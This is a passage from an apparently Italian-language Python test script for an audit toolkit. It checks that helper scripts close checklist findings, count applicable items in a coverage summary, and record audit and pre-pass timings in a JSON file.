    check("punti pericolosi: finding sul file della categoria e «non difetto» con file:riga chiudono le righe",
          "ok   punti pericolosi chiusi per categoria" in r8.stdout, r8.stdout[-600:])
    (md / "findings" / "findings.json").write_text("[]", encoding="utf-8")
    check("checklist: nello standard un problema lasciato nel motivo fa fallire `chiudi`", "FAIL problemi annotati" in r4.stdout, r4.stdout[-400:])
    cs = run("coverage_summary.py", md)
    check("coverage_summary: «si (L2)» conta come applicabile", "applicabili: **1**" in cs.stdout, cs.stdout[-400:])

if have("check_delivery.py") and have("init_audit.py"):
    ta = tmp / "tempi-audit"
    run("init_audit.py", ta)
    (ta / "registro-tool" / "prepass.json").write_text(json.dumps({"passi": [{"secondi": 12.5}, {"secondi": 30}]}), encoding="utf-8")
    rc = run("check_delivery.py", ta)
    tj = json.loads((ta / "registro-tool" / "tempi.json").read_text(encoding="utf-8"))
    check("tempi: init registra l'inizio, la chiusura stampa durata e pre-passaggio e li registra",
          "pre-passaggio 42 s" in rc.stdout and tj.get("inizio") and tj.get("chiusure", [{}])[-1].get("secondi_prepass") == 42.5, rc.stdout[-400:])

print(f"\nriusciti: {ok}  falliti: {fail}")
sys.exit(1 if fail else 0)
